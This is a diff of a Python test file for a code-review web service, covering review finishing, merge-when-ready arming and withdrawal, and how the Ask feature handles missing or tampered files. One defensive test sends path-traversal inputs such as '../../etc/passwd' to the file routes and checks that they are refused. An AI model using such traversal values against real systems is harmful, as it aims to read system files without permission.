@@ -22,6 +22,7 @@ from __future__ import annotations
 import asyncio
 import hashlib
 import json
+import shutil
 from dataclasses import replace
 from pathlib import Path
 from types import SimpleNamespace
@@ -468,7 +469,7 @@ def test_draft_inspection_never_publishes_and_review_writes_require_snapshot(dra
     ):
         response = workspace.post(f"{root}/{suffix}", json=body)
         assert response.status_code == 409, (suffix, response.text)
-        assert "create a Snapshot" in response.json()["detail"]
+        assert "create a revision" in response.json()["detail"]
     assert not workspace.store.list_annotations(workspace.review_id)
     assert workspace.post(f"{root}/revisions/{number}/publish").status_code == 200
     assert workspace.get(root).json()["revision"]["is_published_snapshot"] is True
@@ -507,7 +508,7 @@ def test_automatic_refresh_captures_a_draft_without_publishing(workspace: Worksp
     assert workspace.store.published_snapshot_ids(workspace.review_id) == {saved.id}
     edited = workspace.patch(f"/api/annotations/{annotation_id}", json={"body": "New review comment"})
     assert edited.status_code == 409, edited.text
-    assert "create a Snapshot" in edited.json()["detail"]
+    assert "create a revision" in edited.json()["detail"]
 
 
 def test_the_review_list_and_history_read_their_short_reference_domains_once(
@@ -1177,6 +1178,7 @@ def test_merge_when_ready_requires_explicit_exact_conditions_and_invalidates_on_
     )
     assert linked.status_code == 200, linked.text
     _review_all_current_targets(landing)
+    _finish_review(landing)
     inspected = landing.get(f"/api/reviews/{workspace.review_id}/readiness").json()
     assert inspected["armable"] is True
 
@@ -1234,7 +1236,31 @@ def _merged_on_cancel(session: ReviewSession, revision: Any, *, action: str) -> 
     }
 
 
-def _arm_github_landing(workspace: Workspace, delegate: Any) -> tuple[Workspace, dict[str, Any]]:
+def _finish_review(workspace: Workspace) -> None:
+    """The human finishes the review: only then is Merge when ready offered."""
+
+    snapshot = workspace.get(f"/api/reviews/{workspace.review_id}/readiness").json()["snapshot_id"]
+    finished = workspace.post(
+        f"/api/reviews/{workspace.review_id}/finish",
+        json={"status": "finished", "expected_revision_id": snapshot},
+    )
+    assert finished.status_code == 200, finished.text
+    assert finished.json()["status"] == "finished"
+
+
+def _arm_request(workspace: Workspace, inspected: dict[str, Any]) -> Any:
+    return workspace.post(
+        f"/api/reviews/{workspace.review_id}/landing/arm",
+        json={
+            "armed": True,
+            "expected_revision_id": inspected["snapshot_id"],
+            "expected_tree_fingerprint": inspected["tree_fingerprint"],
+            "expected_conditions_hash": inspected["conditions_hash"],
+        },
+    )
+
+
+def _linked_reviewed_landing(workspace: Workspace, delegate: Any) -> Workspace:
     landing = _landing_client(workspace, delegate)
     linked = landing.post(
         f"/api/reviews/{workspace.review_id}/relationships",
@@ -1248,18 +1274,106 @@ def _arm_github_landing(workspace: Workspace, delegate: Any) -> tuple[Workspace,
     )
     assert linked.status_code == 200, linked.text
     _review_all_current_targets(landing)
+    return landing
+
+
+def _arm_github_landing(workspace: Workspace, delegate: Any) -> tuple[Workspace, dict[str, Any]]:
+    landing = _linked_reviewed_landing(workspace, delegate)
+    _finish_review(landing)
     inspected = landing.get(f"/api/reviews/{workspace.review_id}/readiness").json()
-    armed = landing.post(
-        f"/api/reviews/{workspace.review_id}/landing/arm",
-        json={
-            "armed": True,
-            "expected_revision_id": inspected["snapshot_id"],
-            "expected_tree_fingerprint": inspected["tree_fingerprint"],
-            "expected_conditions_hash": inspected["conditions_hash"],
-        },
-    )
+    armed = _arm_request(landing, inspected)
     assert armed.status_code == 200, armed.text
     return landing, inspected
+
+
+def test_merge_when_ready_is_refused_until_the_review_is_finished(workspace: Workspace) -> None:
+    calls: list[tuple[str, str]] = []
+    landing = _linked_reviewed_landing(workspace, _github_delegate(calls))
+    inspected = landing.get(f"/api/reviews/{workspace.review_id}/readiness").json()
+    assert inspected["armable"] is True
+
+    # Every requirement is met, but the human has not finished the review.
+    refused = _arm_request(landing, inspected)
+
+    assert refused.status_code == 409
+    assert refused.json()["detail"] == "Finish the review before enabling Merge when ready."
+    assert calls == []
+    assert landing_relationship(landing.store, workspace.review_id) is None
+
+    _finish_review(landing)
+    inspected = landing.get(f"/api/reviews/{workspace.review_id}/readiness").json()
+    armed = _arm_request(landing, inspected)
+
+    assert armed.status_code == 200, armed.text
+    assert armed.json()["landing"]["armed"] is True
+    assert calls == [(inspected["snapshot_id"], "arm")]
+
+
+def test_reopening_a_finished_review_withdraws_its_armed_landing_owed_first(workspace: Workspace) -> None:
+    calls: list[tuple[str, str]] = []
+    owed_when_asked: list[tuple[str, str]] = []
+    stores: list[ReviewStore] = []
+    provider = _github_delegate(calls)
+
+    def delegate(session: ReviewSession, revision: Any, *, action: str) -> dict[str, Any]:
+        if action == "cancel":
+            current = landing_metadata(landing_relationship(stores[0], session.id))
+            owed_when_asked.append((str(current.get("provider_cancel")), str(current.get("cancel_reason"))))
+        return provider(session, revision, action=action)
+
+    landing, inspected = _arm_github_landing(workspace, delegate)
+    stores.append(landing.store)
+
+    reopened = landing.post(f"/api/reviews/{workspace.review_id}/finish", json={"status": "open"})
+
+    assert reopened.status_code == 200, reopened.text
+    assert reopened.json()["status"] == "open"
+    # Recorded as owed before the provider was asked, as a reopen.
+    assert owed_when_asked == [("pending", "reopened")]
+    assert calls[-1] == (inspected["snapshot_id"], "cancel")
+    settled = landing_relationship(landing.store, workspace.review_id)
+    assert settled is not None and settled.status == "cancelled"
+    assert landing_metadata(settled)["provider_cancel"] == "done"
+    readiness = landing.get(f"/api/reviews/{workspace.review_id}/readiness").json()
+    assert readiness["landing"]["armed"] is False
+    assert readiness["landing"]["detail"].startswith("The review was reopened; Merge when ready was withdrawn.")
+    assert "discarded" not in readiness["landing"]["detail"]
+    audited = landing.store.list_activity_events(workspace.review_id, kinds=("landing.withdrawn",))
+    assert [item.summary for item in audited] == ["Merge when ready withdrawn: the review was reopened"]
+
+    # Open again: arming is refused until the review is finished again.
+    refused = _arm_request(landing, readiness)
+    assert refused.status_code == 409
+    assert refused.json()["detail"] == "Finish the review before enabling Merge when ready."
+
+
+def test_a_reopen_whose_withdrawal_fails_stays_owed_until_the_provider_confirms(workspace: Workspace) -> None:
+    calls: list[tuple[str, str]] = []
+    outage = {"down": True}
+    landing, inspected = _arm_github_landing(workspace, _cancel_outage_delegate(calls, outage))
+
+    reopened = landing.post(f"/api/reviews/{workspace.review_id}/finish", json={"status": "open"})
+
+    assert reopened.status_code == 200, reopened.text
+    assert calls[-1] == (inspected["snapshot_id"], "cancel")
+    owed = landing_relationship(landing.store, workspace.review_id)
+    assert owed is not None
+    # The provider may still land it: never shown as a settled withdrawal.
+    assert owed.status == "delegated"
+    assert landing_metadata(owed)["provider_cancel"] == "pending"
+    assert landing_metadata(owed)["cancel_reason"] == "reopened"
+    assert "The review was reopened, but withdrawing provider landing FAILED" in landing_metadata(owed)["detail"]
+
+    outage["down"] = False
+    cancelled = landing.post(
+        f"/api/reviews/{workspace.review_id}/landing/cancel",
+        json={"expected_revision_id": inspected["snapshot_id"]},
+    )
+
+    assert cancelled.status_code == 200, cancelled.text
+    assert cancelled.json()["landing"]["state"] == "cancelled"
+    settled = landing_relationship(landing.store, workspace.review_id)
+    assert settled is not None and landing_metadata(settled)["provider_cancel"] == "done"
 
 
 @pytest.mark.parametrize(
@@ -1939,6 +2053,61 @@ def test_review_ask_follows_the_operator_intelligence_policy(
     assert workspace.store.list_ask_messages(workspace.review_id) == ()
 
 
+def test_review_ask_says_up_front_and_on_send_that_no_ai_model_is_set_up(
+    workspace: Workspace, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """With nothing configured the drawer is told so on open, and a send maps to the same plain state."""
+
+    from lemoncrow.core.capabilities.providers import discovery
+
+    async def no_models() -> list[str]:
+        return []
+
+    monkeypatch.setattr(discovery, "discover_models", no_models)
+    monkeypatch.setattr(discovery, "_fetch_ollama", lambda config: [])
+    monkeypatch.delenv("LEMONCROW_LLM_BACKEND", raising=False)
+    ask = _ask_client(workspace, None)
+    url = f"/api/reviews/{workspace.review_id}/ask"
+
+    ai = ask.get(url).json()["ai"]
+    assert ai["status"] == "not_configured"
+    assert ai["setup_help"]["headline"] == "No AI model is set up."
+    assert ai["setup_help"]["steps"][0]["command"].startswith("export ANTHROPIC_API_KEY")
+
+    body = {"revision_number": 0, "body": "Why?"}
+    refused = ask.post(url, json=body)
+    assert refused.status_code == 503, refused.text
+    assert refused.json()["detail"]["code"] == "ai_not_set_up"
+    assert refused.json()["detail"]["message"] == "No AI model is set up."
+
+    streamed = ask.post(f"{url}/stream", json=body)
+    events = [json.loads(line) for line in streamed.text.splitlines() if line.strip()]
+    assert events[-1]["type"] == "error"
+    assert events[-1]["code"] == "ai_not_set_up"
+    assert events[-1]["detail"] == "No AI model is set up."
+    assert events[-1]["setup_help"] == ai["setup_help"]
+    assert workspace.store.list_ask_messages(workspace.review_id) == ()
+
+
+def test_review_ask_offers_no_setup_help_once_a_model_is_configured(
+    workspace: Workspace, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    from lemoncrow.core.capabilities.providers import discovery
+
+    async def no_models() -> list[str]:
+        return []
+
+    monkeypatch.setattr(discovery, "discover_models", no_models)
+    monkeypatch.setattr(discovery, "_fetch_ollama", lambda config: [])
+    monkeypatch.setenv("LEMONCROW_LLM_BACKEND", "openai")
+    ask = _ask_client(workspace, None)
+
+    ai = ask.get(f"/api/reviews/{workspace.review_id}/ask").json()["ai"]
+
+    assert ai["status"] == "ready"
+    assert "setup_help" not in ai
+
+
 def test_review_ask_is_revision_bound_read_only_and_persists_across_restart(workspace: Workspace) -> None:
     contexts: list[dict[str, Any]] = []
 
@@ -2237,14 +2406,14 @@ def test_review_ask_external_text_attachment_is_snapshot_bound_context(workspace
 def test_review_ask_execution_evidence_reaches_the_model_only_through_its_access_projection(
     workspace: Workspace,
 ) -> None:
-    from lemoncrow.pro.capabilities.review.execution import (
+    from lemoncrow.pro.capabilities.review.hermetic import HermeticPolicy, build_execution_result
+    from lemoncrow.pro.environment.execution import (
         ExecutionRecipe,
         ExecutionSubject,
         ExecutorClass,
         SinkCapture,
         StageOutcome,
     )
-    from lemoncrow.pro.capabilities.review.hermetic import HermeticPolicy, build_execution_result
 
     revision = workspace.store.latest_revision(workspace.review_id)
     assert revision is not None
@@ -2837,7 +3006,7 @@ def test_review_ask_from_map_edge_preserves_graph_exactness_and_endpoint_evidenc
                 "exact_for_snapshot": False,
                 "snapshot_head_matches_checkout": True,
                 "index": {"symbols_indexed": 2},
-                "note": "Current index context; not Snapshot exact.",
+                "note": "Current index context; not revision exact.",
             },
             "graph": {
                 "level": "architecture",
@@ -3011,7 +3180,7 @@ def test_review_ask_natural_previous_snapshot_question_gets_comparison(workspace
         f"/api/reviews/{workspace.review_id}/ask",
         json={
             "revision_number": 1,
-            "body": "What changed in this area compared with the previous Snapshot?",
+            "body": "What changed in this area compared with the previous revision?",
             "context": map_node["selection"],
         },
     )
@@ -3649,10 +3818,10 @@ def _plan_row(plan: dict[str, Any], entry_id: str) -> dict[str, Any] | None:
 def test_surface_run_dispatches_surface_through_separate_runner_registry(
     workspace: Workspace, monkeypatch: pytest.MonkeyPatch
 ) -> None:
-    import lemoncrow.pro.capabilities.review.runtimes as runtimes_module
+    import lemoncrow.pro.capabilities.review.runner_host as runtimes_module
     import lemoncrow.pro.capabilities.review.surfaces as surfaces_module
-    from lemoncrow.pro.capabilities.review.runtimes import SurfaceRunResult
     from lemoncrow.pro.capabilities.review.surfaces import ReviewSurface
+    from lemoncrow.pro.environment.runners import SurfaceRunResult
 
     seen: list[tuple[str, str, str]] = []
     surface = ReviewSurface(
@@ -3710,10 +3879,10 @@ def test_surface_run_dispatches_surface_through_separate_runner_registry(
 def test_surface_run_discovers_request_metadata_from_the_requested_old_side(
     workspace: Workspace, monkeypatch: pytest.MonkeyPatch
 ) -> None:
-    import lemoncrow.pro.capabilities.review.runtimes as runtimes_module
+    import lemoncrow.pro.capabilities.review.runner_host as runtimes_module
     import lemoncrow.pro.capabilities.review.surfaces as surfaces_module
-    from lemoncrow.pro.capabilities.review.runtimes import SurfaceRunResult
     from lemoncrow.pro.capabilities.review.surfaces import ReviewSurface
+    from lemoncrow.pro.environment.runners import SurfaceRunResult
 
     materialized: list[str] = []
     selected_titles: list[str] = []
@@ -3778,10 +3947,10 @@ def test_surface_run_discovers_request_metadata_from_the_requested_old_side(
 def test_surface_discovery_and_execution_bind_an_explicit_snapshot(
     workspace: Workspace, monkeypatch: pytest.MonkeyPatch
 ) -> None:
-    import lemoncrow.pro.capabilities.review.runtimes as runtimes_module
+    import lemoncrow.pro.capabilities.review.runner_host as runtimes_module
     import lemoncrow.pro.capabilities.review.surfaces as surfaces_module
-    from lemoncrow.pro.capabilities.review.runtimes import SurfaceRunResult
     from lemoncrow.pro.capabilities.review.surfaces import ReviewSurface
+    from lemoncrow.pro.environment.runners import SurfaceRunResult
 
     original = workspace.store.latest_revision(workspace.review_id)
     assert original is not None
@@ -3871,7 +4040,7 @@ def test_surface_discovery_never_falls_back_to_a_newer_mutable_checkout(
         params={"revision_id": revision.id},
     )
     assert response.status_code == 409, response.text
-    assert "exact Snapshot new-side surface source is unavailable" in response.json()["detail"]
+    assert "exact new-side surface source is unavailable" in response.json()["detail"]
     assert "frozen tree missing" in response.json()["detail"]
 
 
@@ -4047,7 +4216,7 @@ def test_surface_impact_retries_a_side_whose_preview_did_not_render(
 def test_surface_impact_ranks_new_runner_surface_without_executing_it(
     workspace: Workspace, monkeypatch: pytest.MonkeyPatch
 ) -> None:
-    import lemoncrow.pro.capabilities.review.runtimes as runtimes_module
+    import lemoncrow.pro.capabilities.review.runner_host as runtimes_module
     import lemoncrow.pro.capabilities.review.surfaces as surfaces_module
     from lemoncrow.pro.capabilities.review.surfaces import ComparisonDescriptor, ReviewSurface
 
@@ -4096,10 +4265,10 @@ def test_surface_impact_ranks_new_runner_surface_without_executing_it(
 def test_surface_impact_runs_only_explicitly_safe_plugin_surfaces(
     workspace: Workspace, monkeypatch: pytest.MonkeyPatch
 ) -> None:
-    import lemoncrow.pro.capabilities.review.runtimes as runtimes_module
+    import lemoncrow.pro.capabilities.review.runner_host as runtimes_module
     import lemoncrow.pro.capabilities.review.surfaces as surfaces_module
-    from lemoncrow.pro.capabilities.review.runtimes import SurfaceRunResult
     from lemoncrow.pro.capabilities.review.surfaces import ComparisonDescriptor, ReviewSurface
+    from lemoncrow.pro.environment.runners import SurfaceRunResult
 
     safe = ReviewSurface(
         id="safe",
@@ -4175,7 +4344,7 @@ def test_hosted_auto_snapshot_schedules_only_explicit_trusted_surface_without_ru
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     from lemoncrow.pro.capabilities.review.run_plan_service import RunPlanService
-    from lemoncrow.pro.capabilities.review.runtimes import RunnerRegistry
+    from lemoncrow.pro.environment.runners import RunnerRegistry
 
     repo_root = tmp_path / "auto-runtime-repo"
     repo = _init_repo(repo_root)
@@ -4213,7 +4382,7 @@ def test_hosted_auto_snapshot_schedules_only_explicit_trusted_surface_without_ru
             return ()
 
         def run(self, *args, **kwargs):
-            raise AssertionError("the hosted Snapshot-event scheduler must never execute code")
+            raise AssertionError("the hosted revision-event scheduler must never execute code")
 
     dispatched: list[Any] = []
 
@@ -4282,10 +4451,45 @@ def test_hosted_auto_snapshot_schedules_only_explicit_trusted_surface_without_ru
     assert len(dispatched) == 2
 
 
+def test_runtime_validation_refuses_an_invalid_trusted_base_config_without_a_server_error(
+    tmp_path: Path,
+) -> None:
+    repo_root = tmp_path / "runtime-repo"
+    repo = _init_repo(repo_root)
+    _write(repo_root, "src/session.py", "VALUE = 'base'\n")
+    _write(
+        repo_root,
+        ".lemoncrow/review.yaml",
+        "version: 1\nsurfaces:\n  - id: checks\n    provider: service\n    runtime: missing\n    services: [tests]\n",
+    )
+    _commit(repo, "base", 0)
+    _write(repo_root, "src/session.py", "VALUE = 'head'\n")
+    _commit(repo, "head", 1)
+    store_root = tmp_path / "runtime-store"
+    store = ReviewStore(store_root)
+    rng = resolve_rev_range(repo_root, base="HEAD~1", head="HEAD")
+    build = build_review_packet_with_blobs(repo_root, rng, store_root=store_root, with_patch_text=True)
+    session = open_or_create_session(store, repo_root, rng, title=build.packet.title)
+    revision = snapshot_revision(store, session, repo_root, rng, store_root=store_root, build=build)
+    store.publish_snapshot(session.id, revision.id)
+    app = FastAPI()
+    register_review_api(app, store, auth_dependency=make_token_dependency(TOKEN), repo_root=repo_root, port=PORT)
+    workspace = Workspace(TestClient(app, base_url=BASE), store, store_root, repo_root, session.id)
+
+    response = workspace.post(
+        f"/api/reviews/{session.id}/runtime-validation",
+        json={"revision_id": revision.id, "provider": "service", "surface_id": "checks:tests", "side": "new"},
+    )
+
+    assert response.status_code == 409, response.text
+    assert "trusted-base review surfaces could not be read" in response.json()["detail"]
+    assert str(repo_root) not in response.text
+
+
 def test_runtime_validation_uses_trusted_base_config_and_exact_snapshot(
     tmp_path: Path,
 ) -> None:
-    from lemoncrow.pro.capabilities.review.runtimes import RunnerRegistry, SurfaceRunResult
+    from lemoncrow.pro.environment.runners import RunnerRegistry, SurfaceRunResult
 
     repo_root = tmp_path / "runtime-repo"
     repo = _init_repo(repo_root)
@@ -5638,7 +5842,7 @@ def test_generic_source_compare_supports_snapshot_and_commit_in_both_directions(
     assert first is not None
     _write(workspace.repo_root, "src/untouched.py", "COMMITTED = 1\n")
     repo = pygit2.Repository(str(workspace.repo_root))
-    _commit(repo, "new commit after frozen snapshot", 1)
+    _commit(repo, "new commit after frozen revision", 1)
     _write(workspace.repo_root, "src/session.py", "MUTABLE = 1\n")
     for left, right in [("git/HEAD", f"rr/{first.id}"), (f"rr/{first.id}", "git/HEAD")]:
         response = workspace.get("/api/compare", params={"from_ref": left, "to_ref": right})
@@ -5854,6 +6058,7 @@ def test_browser_checks_and_landing_do_their_store_work_off_the_event_loop(
     assert linked.status_code == 200, linked.text
     _review_all_current_targets(workspace)
     shot = _upload(workspace, revision.id, kind="screenshot", title="session", payload=_PNG, mime="image/png")
+    _finish_review(workspace)
     for method in (
         "read_source_tree_artifact",
         "get_evidence",
@@ -5929,6 +6134,171 @@ def test_an_ask_snapshot_prunes_idle_snapshots_beyond_a_few_per_review_and_a_few
         "review used 2.5h ago",
     }
     assert not (snapshots / "review-2.75h").exists()
+
+
+def _ask_tree(workspace: Workspace, monkeypatch: pytest.MonkeyPatch, held: dict[str, bytes | None]) -> None:
+    """Give the Snapshot a stored source tree; ``None`` is a file whose bytes were never stored."""
+
+    revision = workspace.store.latest_revision(workspace.review_id)
+    assert revision is not None
+    named = {path: (content if content is not None else path.encode()) for path, content in held.items()}
+    workspace.store.write_source_tree_artifact(
+        workspace.review_id,
+        revision.id,
+        {
+            path: {"content_digest": hashlib.sha256(raw).hexdigest(), "mode": 0o100644, "size": len(raw)}
+            for path, raw in named.items()
+        },
+        side="new",
+    )
+    content = {hashlib.sha256(named[path]).hexdigest(): raw for path, raw in held.items() if raw is not None}
+    monkeypatch.setattr(workspace.store, "read_source_content", content.get)
+
+
+def test_ask_answers_without_a_file_whose_bytes_were_never_stored_and_says_so(
+    workspace: Workspace, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    from lemoncrow.pro.capabilities.review import ask as ask_module
+
+    _ask_tree(workspace, monkeypatch, {"src/session.py": b"value = 1\n", "docs/demo.gif": None})
+    contexts: list[dict[str, Any]] = []
+    roots: list[Path] = []
+
+    def answer(context: dict[str, Any], *, project_root: Path, **_kwargs: Any) -> dict[str, str]:
+        contexts.append(context)
+        roots.append(project_root)
+        return {"intent": "question", "body": "answer"}
+
+    monkeypatch.setattr(ask_module, "answer_ask", answer)
+    for question in ("First?", "Second, from the cached Snapshot?"):
+        asked = workspace.post(
+            f"/api/reviews/{workspace.review_id}/ask",
+            json={"revision_number": 0, "body": question, "driver": "codex"},
+        )
+        assert asked.status_code == 201, asked.text
+        notices = [row for row in asked.json()["assistant"]["references"] if row["kind"] == "source_unavailable"]
+        assert notices == [
+            {
+                "kind": "source_unavailable",
+                "label": "docs/demo.gif was not available to Ask",
+                "paths": ["docs/demo.gif"],
+            }
+        ]
+    assert [context["source_files_unavailable"] for context in contexts] == [
+        {"count": 1, "paths": ["docs/demo.gif"]},
+        {"count": 1, "paths": ["docs/demo.gif"]},
+    ]
+    assert (roots[0] / "src/session.py").read_bytes() == b"value = 1\n"
+    assert not (roots[0] / "docs/demo.gif").exists()
+
+
+def test_ask_does_not_name_a_missing_file_the_route_may_not_read(
+    workspace: Workspace, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    from dataclasses import replace
+
+    from lemoncrow.pro.capabilities.review import ask as ask_module
+    from lemoncrow.pro.capabilities.review import rules
+
+    _ask_tree(workspace, monkeypatch, {"src/session.py": b"value = 1\n", "secret/keys.bin": None, "docs/a.gif": None})
+    original = rules.content_access_for_path
+
+    def access(path: str, *args: Any, **kwargs: Any) -> Any:
+        decision = original(path, *args, **kwargs)
+        return replace(decision, allowed=False) if path.startswith("secret/") else decision
+
+    monkeypatch.setattr(rules, "content_access_for_path", access)
+    contexts: list[dict[str, Any]] = []
+
+    def answer(context: dict[str, Any], **_kwargs: Any) -> dict[str, str]:
+        contexts.append(context)
+        return {"intent": "question", "body": "answer"}
+
+    monkeypatch.setattr(ask_module, "answer_ask", answer)
+    asked = workspace.post(
+        f"/api/reviews/{workspace.review_id}/ask",
+        json={"revision_number": 0, "body": "Anything?", "driver": "codex"},
+    )
+
+    assert asked.status_code == 201, asked.text
+    assert contexts[0]["source_files_unavailable"] == {"count": 1, "paths": ["docs/a.gif"]}
+    assert "secret/keys.bin" not in json.dumps(asked.json()["assistant"]["references"])
+
+
+def test_ask_counts_every_missing_file_and_names_only_the_first_ones(
+    workspace: Workspace, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    from lemoncrow.pro.capabilities.review import api as api_module
+    from lemoncrow.pro.capabilities.review import ask as ask_module
+
+    shown = api_module._ASK_UNAVAILABLE_FILES_SHOWN
+    contexts: list[dict[str, Any]] = []
+
+    def answer(context: dict[str, Any], **_kwargs: Any) -> dict[str, str]:
+        contexts.append(context)
+        return {"intent": "question", "body": "answer"}
+
+    monkeypatch.setattr(ask_module, "answer_ask", answer)
+    for total in (shown, shown + 1):
+        _ask_tree(
+            workspace,
+            monkeypatch,
+            {
+                "src/session.py": f"value = {total}\n".encode(),
+                **{f"big/{total}-{n:03}.bin": None for n in range(total)},
+            },
+        )
+        for cached in workspace.store.root.glob("cache/review-ask-snapshots/*"):
+            shutil.rmtree(cached)
+        asked = workspace.post(
+            f"/api/reviews/{workspace.review_id}/ask",
+            json={"revision_number": 0, "body": "Anything?", "driver": "codex"},
+        )
+
+        assert asked.status_code == 201, asked.text
+        assert contexts[-1]["source_files_unavailable"]["count"] == total
+        assert len(contexts[-1]["source_files_unavailable"]["paths"]) == shown
+        notice = [row for row in asked.json()["assistant"]["references"] if row["kind"] == "source_unavailable"]
+        assert notice[0]["label"] == f"{total} files were not available to Ask"
+
+
+def test_ask_with_every_file_stored_reports_nothing_missing(
+    workspace: Workspace, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    from lemoncrow.pro.capabilities.review import ask as ask_module
+
+    _ask_tree(workspace, monkeypatch, {"src/session.py": b"value = 1\n"})
+    contexts: list[dict[str, Any]] = []
+
+    def answer(context: dict[str, Any], **_kwargs: Any) -> dict[str, str]:
+        contexts.append(context)
+        return {"intent": "question", "body": "answer"}
+
+    monkeypatch.setattr(ask_module, "answer_ask", answer)
+    asked = workspace.post(
+        f"/api/reviews/{workspace.review_id}/ask",
+        json={"revision_number": 0, "body": "Anything?", "driver": "codex"},
+    )
+
+    assert asked.status_code == 201, asked.text
+    assert "source_files_unavailable" not in contexts[0]
+    assert all(row["kind"] != "source_unavailable" for row in asked.json()["assistant"]["references"])
+
+
+def test_ask_refuses_stored_bytes_that_fail_their_digest(workspace: Workspace, monkeypatch: pytest.MonkeyPatch) -> None:
+    from lemoncrow.pro.capabilities.review import ask as ask_module
+
+    _ask_tree(workspace, monkeypatch, {"src/session.py": b"value = 1\n"})
+    monkeypatch.setattr(workspace.store, "read_source_content", lambda _digest: b"tampered")
+    monkeypatch.setattr(ask_module, "answer_ask", lambda *_args, **_kwargs: pytest.fail("must not answer"))
+
+    asked = workspace.post(
+        f"/api/reviews/{workspace.review_id}/ask",
+        json={"revision_number": 0, "body": "Anything?", "driver": "codex"},
+    )
+
+    assert asked.status_code == 503
+    assert "does not match its digest" in asked.json()["detail"]
 
 
 def test_reopening_is_the_same_route_with_a_different_state(workspace: Workspace) -> None:
@@ -6021,6 +6391,128 @@ def test_file_contents_route_returns_frozen_old_and_new_text_for_diff_expansion(
     assert body["status"] == "modified"
     assert 'return {"status": "expired"}' in body["old_content"]
     assert 'return {"status": "invalid"}' in body["new_content"]
+
+
+def _rewrite_packet(workspace: Workspace, edit: Any) -> Any:
+    """Replace the latest revision's stored packet with *edit*'s result, the way a projection update does."""
+
+    import gzip
+
+    revision = workspace.store.latest_revision(workspace.review_id)
+    assert revision is not None
+    packet = json.loads(gzip.decompress(workspace.store.read_packet_artifact(revision) or b""))
+    edit(packet)
+    workspace.store.update_revision_projection(
+        revision.id,
+        packet_payload=gzip.compress(json.dumps(packet).encode("utf-8"), mtime=0),
+        packet_schema_version=revision.packet_schema_version,
+        degraded=revision.degraded,
+        provenance_host=revision.provenance_host,
+        provenance_model=revision.provenance_model,
+        provenance_session_id=revision.provenance_session_id,
+        provenance_certainty=revision.provenance_certainty,
+        units=workspace.store.list_units(revision.id),
+    )
+    return revision
+
+
+def test_file_reads_follow_the_packet_when_it_is_rewritten(workspace: Workspace) -> None:
+    """A warm per-file read never answers from a packet the Snapshot no longer has."""
+
+    url = f"/api/reviews/{workspace.review_id}/files/src/session.py"
+    warm = workspace.get(f"{url}/patch").json()
+    assert warm["renderable"] is True and "invalid" in warm["patch"]
+    assert workspace.get(f"{url}/patch").json() == warm
+
+    def drop_entry(packet: dict[str, Any]) -> None:
+        packet["files"] = [item for item in packet["files"] if item["path"] != "src/session.py"]
+
+    _rewrite_packet(workspace, drop_entry)
+    refused = workspace.get(f"{url}/patch").json()
+    assert refused["renderable"] is False and refused["patch"] == ""
+    assert refused["refusal"] == "file_not_in_packet"
+    assert refused["detail"] == "this revision's packet has no entry for that path"
+    contents = workspace.get(f"{url}/contents")
+    assert contents.status_code == 409
+    assert contents.json()["detail"] == "this Review revision has no file artifact for that path"
+    # the file is still a unit of the review, so it is a refusal and not a missing file
+    assert workspace.get(f"{url}/patch").status_code == 200
+
+
+def test_file_reads_say_so_when_the_packet_cannot_be_read(workspace: Workspace) -> None:
+    url = f"/api/reviews/{workspace.review_id}/files/src/session.py"
+    assert workspace.get(f"{url}/patch").json()["renderable"] is True
+    revision = workspace.store.latest_revision(workspace.review_id)
+    assert revision is not None
+    workspace.store._confined(revision.packet_path).write_bytes(b"corrupt")
+    # the warm index belongs to the old digest only while the file is the one that was indexed
+    workspace.store._packet_index_memo.clear()
+
+    body = workspace.get(f"{url}/patch").json()
+    assert body["renderable"] is False
+    assert body["refusal"] == "packet_unavailable"
+    assert body["detail"] == "the packet that recorded this revision is not readable"
+    assert workspace.get(f"{url}/contents").status_code == 409
+
+
+def test_file_reads_refuse_what_is_not_a_file_of_the_review_even_when_the_packet_is_warm(
+    workspace: Workspace, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    base = f"/api/reviews/{workspace.review_id}/files"
+    assert workspace.get(f"{base}/src/session.py/patch").status_code == 200  # warms the packet index
+    assert workspace.get(f"{base}/src/session.py/contents").status_code == 200
+
+    def _explode(self: Any, revision: Any) -> bytes:
+        raise AssertionError("a refused path read the stored packet")
+
+    monkeypatch.setattr(ReviewStore, "read_packet_artifact", _explode)
+    # A cold memo, so a refused path that reached the packet would have to read it and trip the guard.
+    workspace.store._packet_index_memo.clear()
+    for path in ("src/untouched.py", "src/missing.py", "src", "../../etc/passwd", "/etc/passwd"):
+        for route in ("patch", "contents"):
+            response = workspace.get(f"{base}/{path}/{route}")
+            assert response.status_code == 404, (path, route)
+            if not path.startswith((".", "/")):  # a traversal may be refused by the router before the route
+                assert response.json()["detail"] == "no such file in this review"
+
+
+def test_a_later_snapshot_never_answers_from_an_earlier_snapshots_packet(workspace: Workspace) -> None:
+    """Each Snapshot reads its own packet, whichever was read first and whichever is the latest."""
+
+    review = workspace.review_id
+    first = workspace.get(f"/api/reviews/{review}/files/src/session.py/patch").json()
+    assert 'return {"status": "invalid"}' in first["patch"]
+    _write(workspace.repo_root, "src/session.py", _CHANGED_SOURCE.replace('"invalid"', '"second"'))
+    assert workspace.post(f"/api/reviews/{review}/refresh").status_code == 200
+
+    latest = workspace.get(f"/api/reviews/{review}/files/src/session.py/patch").json()
+    assert latest["revision_id"] != first["revision_id"]
+    assert '+            return {"status": "second"}' in latest["patch"]
+    assert '"invalid"' not in latest["patch"]
+    older = workspace.get(f"/api/reviews/{review}/revisions/0/files/src/session.py/patch").json()
+    assert older["revision_id"] == first["revision_id"]
+    assert older["patch"] == first["patch"]
+    assert workspace.get(f"/api/reviews/{review}/files/src/session.py/patch").json()["patch"] == latest["patch"]
+
+
+def test_an_ordinary_files_reads_never_decode_the_whole_packet(
+    workspace: Workspace, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """An ordinary file's patch needs the packet's one entry; the packet is decoded once for the Snapshot."""
+
+    reads: list[str] = []
+    real = ReviewStore.read_packet_artifact
+
+    def counted(self: ReviewStore, revision: Any) -> bytes | None:
+        reads.append(revision.id)
+        return real(self, revision)
+
+    monkeypatch.setattr(ReviewStore, "read_packet_artifact", counted)
+    url = f"/api/reviews/{workspace.review_id}/files/src/session.py"
+    for _ in range(3):
+        assert workspace.get(f"{url}/patch").status_code == 200
+        assert workspace.get(f"{url}/contents").status_code == 200
+    assert len(reads) == 1, "the packet was read once for the Snapshot, not once per request"
 
 
